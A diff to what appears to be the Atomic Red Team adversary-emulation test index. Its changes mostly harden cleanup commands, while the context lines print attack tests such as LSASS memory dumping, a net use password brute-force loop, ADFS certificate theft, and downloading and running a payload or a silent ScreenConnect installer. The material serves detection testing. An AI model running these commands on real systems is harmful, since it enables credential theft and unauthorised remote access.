@@ -3820,7 +3820,7 @@ credential-access:
           $FIELDS = $LSASS -split "\s+"
           $ID = $FIELDS[1]
           & "#{createdump_exe}" -u -f #{output_file} $ID
-        cleanup_command: 'del #{output_file}
+        cleanup_command: 'Remove-Item #{output_file} -ErrorAction Ignore
 
 '
         name: powershell
@@ -3856,7 +3856,7 @@ credential-access:
           Invoke-WebRequest "https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe" -OutFile #{xordump_exe}
       executor:
         command: "#{xordump_exe} -out #{output_file} -x 0x41\n"
-        cleanup_command: 'Remove-Item ${output_file} -ErrorAction Ignore
+        cleanup_command: 'Remove-Item #{output_file} -ErrorAction Ignore
 
 '
         name: powershell
@@ -4511,10 +4511,10 @@ credential-access:
       executor:
         command: netsh trace start capture=yes tracefile=%temp%\trace.etl maxsize=10
         cleanup_command: |-
-          netsh trace stop
-          TIMEOUT /T 50
-          del %temp%\trace.etl
-          del %temp%\trace.cab
+          netsh trace stop >nul 2>&1
+          TIMEOUT /T 5 >nul 2>&1
+          del %temp%\trace.etl >nul 2>&1
+          del %temp%\trace.cab >nul 2>&1
         name: command_prompt
         elevation_required: true
   T1003:
@@ -5045,8 +5045,8 @@ credential-access:
           echo "Password!" >> #{input_file_passwords}
           @FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL
         cleanup_command: |-
-          del #{input_file_users}
-          del #{input_file_passwords}
+          del #{input_file_users} >nul 2>&1
+          del #{input_file_passwords} >nul 2>&1
     - name: Brute Force Credentials of single Active Directory domain user via LDAP
         against domain controller (NTLM or Kerberos)
       auto_generated_guid: c2969434-672b-4ec8-8df0-bbb91f40e250
@@ -5821,8 +5821,8 @@ credential-access:
           Get-ChildItem | Where-Object {$_ -like "ADFS*"}
           Write-Host "`nCertificates retrieved successfully"
         cleanup_command: |
-          Remove-Item -Path ".\ADFS_encryption.pfx"
-          Remove-Item -Path ".\ADFS_signing.pfx"
+          Remove-Item -Path ".\ADFS_encryption.pfx" -ErrorAction Ignore
+          Remove-Item -Path ".\ADFS_signing.pfx" -ErrorAction Ignore
         name: powershell
     - name: ADFS token signing and encryption certificates theft - Remote
       auto_generated_guid: cab413d8-9e4a-4b8d-9b84-c985bd73a442
@@ -5886,8 +5886,8 @@ credential-access:
           -Configuration $ADFSConfig -Key $key\nGet-ChildItem | Where-Object {$_ -like
           \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n"
         cleanup_command: |
-          Remove-Item -Path ".\ADFS_encryption.pfx"
-          Remove-Item -Path ".\ADFS_signing.pfx"
+          Remove-Item -Path ".\ADFS_encryption.pfx" -ErrorAction Ignore
+          Remove-Item -Path ".\ADFS_signing.pfx" -ErrorAction Ignore
         name: powershell
   T1003.007:
     technique:
@@ -6330,9 +6330,8 @@ credential-access:
         name: powershell
         elevation_required: false
         cleanup_command: |
-          write-host ""
           $toremove = #{dump_path} + "\" + '#{dumped_hive}'
-          rm $toremove
+          rm $toremove -ErrorAction Ignore
     - name: dump volume shadow copy hives with System.IO.File
       auto_generated_guid: 9d77fed7-05f8-476e-a81b-8ff0472c64d0
       description: 'Dump hives from volume shadow copies with System.IO.File
@@ -6365,9 +6364,8 @@ credential-access:
         name: powershell
         elevation_required: false
         cleanup_command: |-
-          write-host ""
           $toremove = #{dump_path} + "\" + '#{dumped_hive}'
-          rm $toremove
+          rm $toremove -ErrorAction Ignore
   T1555.002:
     technique:
       external_references:
@@ -7861,7 +7859,7 @@ collection:
           mkdir %temp%\T1119_command_prompt_collection >nul 2>&1
           dir c: /b /s .docx | findstr /e .docx
           for /R c: %f in (*.docx) do copy %f %temp%\T1119_command_prompt_collection
-        cleanup_command: 'del %temp%\T1119_command_prompt_collection /F /Q >null 2>&1
+        cleanup_command: 'del %temp%\T1119_command_prompt_collection /F /Q >nul 2>&1
 
 '
         name: command_prompt
@@ -12547,11 +12545,7 @@ privilege-escalation:
           $owners = @{}
           gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
           Get-Process | Select ProcessName,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}
-          Set-Location $PathToAtomicsFolder
-          .\T1134.002\src\GetToken.ps1; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")
-        cleanup_command: 'taskkill /im cmd.exe /f
-
-'
+          $PathToAtomicsFolder\T1134.002\src\GetToken.ps1; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")
         name: powershell
         elevation_required: true
   T1543:
@@ -13366,11 +13360,13 @@ privilege-escalation:
           Get-AzureADExternalDomainFederation -ExternalDomainName "#{domain_name}"
           Write-Host "End of federation configuration."
         cleanup_command: |
-          Import-Module AzureADPreview
+          try {
+          Import-Module AzureADPreview -ErrorAction Ignore
           $PWord = ConvertTo-SecureString -String "#{azure_password}" -AsPlainText -Force
           $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{azure_username}", $Pword
-          Connect-AzureAD -Credential $Credential > $null
+          Connect-AzureAD -Credential $Credential -ErrorAction Ignore
           Remove-AzureADExternalFederationDomain -ExternalDomainName "#{domain_name}"
+          } catch {}
         name: powershell
   T1574.004:
     technique:
@@ -16387,6 +16383,7 @@ privilege-escalation:
 
 '
         cleanup_command: 'reg delete "hklm\system\currentcontrolset\control\print\monitors\ART"
+          /f >nul 2>&1
 
 '
         name: command_prompt
@@ -20960,7 +20957,7 @@ defense-evasion:
           /eventName:desktopimgdownldr
 
 '
-        cleanup_command: 'del #{cleanup_path}\#{cleanup_file} >null 2>&1
+        cleanup_command: 'del #{cleanup_path}\#{cleanup_file} >nul 2>&1
 
 '
         name: command_prompt
@@ -23540,11 +23537,7 @@ defense-evasion:
           $owners = @{}
           gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
           Get-Process | Select ProcessName,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}
-          Set-Location $PathToAtomicsFolder
-          .\T1134.002\src\GetToken.ps1; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")
-        cleanup_command: 'taskkill /im cmd.exe /f
-
-'
+          $PathToAtomicsFolder\T1134.002\src\GetToken.ps1; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")
         name: powershell
         elevation_required: true
   T1578.001:
@@ -25799,13 +25792,11 @@ defense-evasion:
           $test = Get-AntiPhishRule
           Disable-AntiPhishRule -Identity $test.Name -Confirm:$false
           Get-AntiPhishRule
-        cleanup_command: |
-          $secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force
-          $creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd
-          Connect-ExchangeOnline -Credential $creds
-          $test = Get-AntiPhishRule
-          Enable-AntiPhishRule -Identity $test.Name -Confirm:$false
-          Get-AntiPhishRule
+        cleanup_command: "if(\"#{password}\" -ne \"\") {\n$secure_pwd = (\"#{password}\"
+          + \"\") | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object
+          System.Management.Automation.PSCredential -ArgumentList \"#{username}\",
+          $secure_pwd\nConnect-ExchangeOnline -Credential $creds\n$test = Get-AntiPhishRule\nEnable-AntiPhishRule
+          -Identity $test.Name -Confirm:$false\nGet-AntiPhishRule\n} \n"
         name: powershell
         elevation_required: false
     - name: Disable Windows Defender with DISM
@@ -26169,11 +26160,13 @@ defense-evasion:
           Get-AzureADExternalDomainFederation -ExternalDomainName "#{domain_name}"
           Write-Host "End of federation configuration."
         cleanup_command: |
-          Import-Module AzureADPreview
+          try {
+          Import-Module AzureADPreview -ErrorAction Ignore
           $PWord = ConvertTo-SecureString -String "#{azure_password}" -AsPlainText -Force
           $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{azure_username}", $Pword
-          Connect-AzureAD -Credential $Credential > $null
+          Connect-AzureAD -Credential $Credential -ErrorAction Ignore
           Remove-AzureADExternalFederationDomain -ExternalDomainName "#{domain_name}"
+          } catch {}
         name: powershell
   T1601.002:
     technique:
@@ -28973,9 +28966,7 @@ defense-evasion:
              Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
              Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
           }
-          catch {
-             Write-Host "Elevation required but not provided" -ForegroundColor Red
-          }
+          catch { }
         name: powershell
         elevation_required: true
     - name: Install root CA on Windows with certutil
@@ -29007,9 +28998,11 @@ defense-evasion:
 
 '
         cleanup_command: |
+          try {
           $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My
           Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
           Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
+          } catch { }
         name: powershell
         elevation_required: true
   T1218.004:
@@ -30960,8 +30953,8 @@ defense-evasion:
         command: 'Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine
 
 '
-        cleanup_command: 'Set-ExecutionPolicy -ExecutionPolicy #{default_execution_policy}
-          -Scope LocalMachine
+        cleanup_command: 'try { Set-ExecutionPolicy -ExecutionPolicy #{default_execution_policy}
+          -Scope LocalMachine -Force } catch {}
 
 '
         name: powershell
@@ -39242,30 +39235,19 @@ defense-evasion:
       - windows
       input_arguments:
         file_or_folder:
-          description: Path of the file or folder remove attribute.
+          description: Path of the files to hide.
           type: Path
           default: "%temp%\\T1222.001_attrib_2"
-      dependency_executor_name: command_prompt
-      dependencies:
-      - description: 'Test requires a file to modify to be located at (#{file_or_folder})
-
-'
-        prereq_command: 'IF EXIST #{file_or_folder} ( EXIT 0 ) ELSE ( EXIT 1 )
-
-'
-        get_prereq_command: |
-          mkdir #{file_or_folder}
-          echo T1222.001_attrib1 >> #{file_or_folder}\T1222.001_attrib1.txt
-          echo T1222.001_attrib2 >> #{file_or_folder}\T1222.001_attrib2.txt
       executor:
         command: |
+          mkdir #{file_or_folder} >nul 2>&1
+          echo T1222.001_attrib1 >> #{file_or_folder}\T1222.001_attrib1.txt
+          echo T1222.001_attrib2 >> #{file_or_folder}\T1222.001_attrib2.txt
           attrib.exe +h #{file_or_folder}\T1222.001_attrib1.txt
           attrib.exe +h #{file_or_folder}\T1222.001_attrib2.txt
-        cleanup_command: |
-          attrib.exe -h #{file_or_folder}\T1222.001_attrib1.txt
-          attrib.exe -h #{file_or_folder}\T1222.001_attrib2.txt
-          del #{file_or_folder}\T1222.001_attrib*.txt
-          rmdir #{file_or_folder}
+        cleanup_command: 'del /A:H #{file_or_folder}\T1222.001_attrib*.txt >nul 2>&1
+
+'
         name: command_prompt
     - name: Grant Full Access to folder for Everyone - Ryuk Ransomware Style
       auto_generated_guid: ac7e6118-473d-41ec-9ac0-ef4f1d1ed2f6
@@ -39443,7 +39425,7 @@ defense-evasion:
 '
       executor:
         command: "#{msxsl_exe} #{xmlfile} #{xslfile}\n"
-        cleanup_command: 'Remove-Item -Path #{msxsl_exe} -Force -ErrorAction Ignore
+        cleanup_command: 'del #{msxsl_exe} >nul 2>&1
 
 '
         name: command_prompt
@@ -39483,7 +39465,7 @@ defense-evasion:
 '
       executor:
         command: "#{msxsl_exe} #{xmlfile} #{xslfile}\n"
-        cleanup_command: 'Remove-Item -Path #{msxsl_exe} -Force -ErrorAction Ignore
+        cleanup_command: 'del -Path #{msxsl_exe} >nul 2>&1
 
 '
         name: command_prompt
@@ -40234,15 +40216,17 @@ persistence:
           $auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $thumb
           Write-Host "Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)"
           Write-Host "End of Hijacking"
-        cleanup_command: "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString
-          -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName
-          System.Management.Automation.PSCredential -ArgumentList \"#{username}\",
-          $Pword\nConnect-AzureAD -Credential $Credential\n\n$sp = Get-AzureADServicePrincipal
-          -Searchstring \"#{service_principal_name}\"\n$credz = Get-AzureADServicePrincipalKeyCredential
-          -ObjectId $sp.ObjectId\nforeach ($cred in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier)
+        cleanup_command: "try {\nImport-Module -Name AzureAD -ErrorAction Ignore\n$PWord
+          = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential
+          = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList
+          \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction
+          Ignore\n\n$sp = Get-AzureADServicePrincipal -Searchstring \"#{service_principal_name}\"\n$credz
+          = Get-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId\nforeach
+          ($cred in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier)
           -eq \"AtomicTest\") {\n    Remove-AzureADServicePrincipalKeyCredential -ObjectId
           $sp.ObjectId -KeyId $cred.KeyId\n  }  \n}\nGet-ChildItem -Path Cert:\\CurrentUser\\My
-          | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item\nrm \"#{path_to_cert}\\#{service_principal_name}.pfx\"\n"
+          | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item\nrm \"#{path_to_cert}\\#{service_principal_name}.pfx\"\n}
+          catch {}\n"
         name: powershell
         elevation_required: false
     - name: Azure AD Application Hijacking - App Registration
@@ -40310,15 +40294,17 @@ persistence:
           $auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $thumb
           Write-Host "Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)"
           Write-Host "End of Hijacking"
-        cleanup_command: "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString
-          -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName
-          System.Management.Automation.PSCredential -ArgumentList \"#{username}\",
-          $Pword\nConnect-AzureAD -Credential $Credential\n\n$app = Get-AzureADApplication
-          -Searchstring \"#{application_name}\"\n$credz = Get-AzureADApplicationKeyCredential
-          -ObjectId $app.ObjectId\nforeach ($cred in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier)
+        cleanup_command: "try {\nImport-Module -Name AzureAD -ErrorAction Ignore\n$PWord
+          = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential
+          = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList
+          \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction
+          Ignore\n\n$app = Get-AzureADApplication -Searchstring \"#{application_name}\"\n$credz
+          = Get-AzureADApplicationKeyCredential -ObjectId $app.ObjectId\nforeach ($cred
+          in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier)
           -eq \"AtomicTest\") {\n    Remove-AzureADApplicationKeyCredential -ObjectId
           $app.ObjectId -KeyId $cred.KeyId\n  }  \n}\nGet-ChildItem -Path Cert:\\CurrentUser\\My
-          | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item\nrm \"#{path_to_cert}\\#{application_name}.pfx\"\n"
+          | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item\nrm \"#{path_to_cert}\\#{application_name}.pfx\"\n}
+          catch {}\n"
         name: powershell
         elevation_required: false
     - name: AWS - Create Access Key and Secret Key
@@ -41194,7 +41180,7 @@ persistence:
           /eventName:desktopimgdownldr
 
 '
-        cleanup_command: 'del #{cleanup_path}\#{cleanup_file} >null 2>&1
+        cleanup_command: 'del #{cleanup_path}\#{cleanup_file} >nul 2>&1
 
 '
         name: command_prompt
@@ -45477,8 +45463,8 @@ persistence:
           mkdir  %APPDATA%\Microsoft\Outlook\ >nul 2>&1
           echo "Atomic Red Team TEST" > %APPDATA%\Microsoft\Outlook\VbaProject.OTM
         cleanup_command: |
-          reg delete "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security\Level" /f
-          del %APPDATA%\Microsoft\Outlook\VbaProject.OTM
+          reg delete "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security\Level" /f >nul 2>&1
+          del %APPDATA%\Microsoft\Outlook\VbaProject.OTM >nul 2>&1
         name: command_prompt
   T1137.001:
     technique:
@@ -45652,7 +45638,7 @@ persistence:
 
 '
         cleanup_command: 'reg delete "HKEY_CURRENT_USER\Software\Microsoft\Office
-          test\Special\Perf"
+          test\Special\Perf" /f >nul 2>&1
 
 '
         name: command_prompt
@@ -45791,7 +45777,7 @@ persistence:
 
 '
         cleanup_command: 'reg.exe delete HKCU\Software\Microsoft\Office\#{outlook_version}\Outlook\WebView\#{outlook_folder}
-          /v URL /f
+          /v URL /f >nul 2>&1
 
 '
   T1137.005:
@@ -46657,6 +46643,7 @@ persistence:
 
 '
         cleanup_command: 'reg delete "hklm\system\currentcontrolset\control\print\monitors\ART"
+          /f >nul 2>&1
 
 '
         name: command_prompt
@@ -51658,10 +51645,10 @@ impact:
 
 '
         cleanup_command: 'schtasks.exe /Change /TN "\Microsoft\Windows\SystemRestore\SR"
-          /enable
+          /enable >nul 2>&1
 
 '
-        name: powershell
+        name: command_prompt
         elevation_required: true
   T1491.001:
     technique:
@@ -54607,7 +54594,7 @@ discovery:
         command: |
           New-Item -Path "#{output_path}" -ItemType Directory > $null
           & "#{sharphound_path}" -d "#{domain}" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory "#{output_path}"
-        cleanup_command: 'Remove-Item -Recurse #{output_path}
+        cleanup_command: 'Remove-Item -Recurse #{output_path} -ErrorAction Ignore
 
 '
     - name: Wmic Group Discovery
@@ -55154,10 +55141,10 @@ discovery:
       executor:
         command: netsh trace start capture=yes tracefile=%temp%\trace.etl maxsize=10
         cleanup_command: |-
-          netsh trace stop
-          TIMEOUT /T 50
-          del %temp%\trace.etl
-          del %temp%\trace.cab
+          netsh trace stop >nul 2>&1
+          TIMEOUT /T 5 >nul 2>&1
+          del %temp%\trace.etl >nul 2>&1
+          del %temp%\trace.cab >nul 2>&1
         name: command_prompt
         elevation_required: true
   T1201:
@@ -62648,7 +62635,7 @@ execution:
         command: |
           Invoke-WebRequest #{pua_url} -OutFile #{pua_file}
           & "#{pua_file}"
-        cleanup_command: 'Remove-Item #{pua_file}
+        cleanup_command: 'Remove-Item #{pua_file} -ErrorAction Ignore
 
 '
     - name: Office Generic Payload Download
@@ -65102,7 +65089,7 @@ execution:
         command: 'echo "#{message}" > "#{file_contents_path}" & type "#{file_contents_path}"
 
 '
-        cleanup_command: 'del "#{file_contents_path}"
+        cleanup_command: 'del "#{file_contents_path}" >nul 2>&1
 
 '
         name: command_prompt
@@ -65351,7 +65338,7 @@ execution:
           Invoke-WmiMethod -Path #{new_class} -Name create -ArgumentList #{process_to_execute}
         cleanup_command: |
           $CleanupClass = New-Object Management.ManagementClass(New-Object Management.ManagementPath("#{new_class}"))
-          $CleanupClass.Delete()
+          try { $CleanupClass.Delete() } catch {}
     - name: WMI Execute rundll32
       auto_generated_guid: '00738d2a-4651-4d76-adf2-c43a41dfb243'
       description: 'This test uses wmic.exe to execute a DLL function using rundll32.
@@ -68918,8 +68905,9 @@ command-and-control:
           & $imewdbled #{remote_url}
         cleanup_command: "$inetcache = $env:LOCALAPPDATA + \"\\Microsoft\\Windows\\INetCache\\\"
           \n$file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include
-          #{file_name}* -Recurse -Force -File -ErrorAction SilentlyContinue)\ncmd.exe
-          /c \"del $file_to_be_removed\"\n"
+          #{file_name}* -Recurse -Force -File -ErrorAction SilentlyContinue)\nif(\"\"
+          -ne \"$file_to_be_removed\") { Remove-Item \"$file_to_be_removed\" -ErrorAction
+          Ignore }\n"
         name: powershell
     - name: Curl Download File
       auto_generated_guid: 2b080b99-0deb-4d51-af0f-833d37c4ca6a
@@ -70174,7 +70162,8 @@ command-and-control:
           $installer = "C:\Users\$env:username\Downloads\ScreenConnect.msi"
           Invoke-WebRequest -OutFile $installer "https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi"
           msiexec /i $installer /qn
-        cleanup_command: $installer = "C:\Users\$env:username\Downloads\ScreenConnect.msi"
+        cleanup_command: |
+          $installer = "C:\Users\$env:username\Downloads\ScreenConnect.msi"
           msiexec /x $installer /qn
         name: powershell
         elevation_required: true
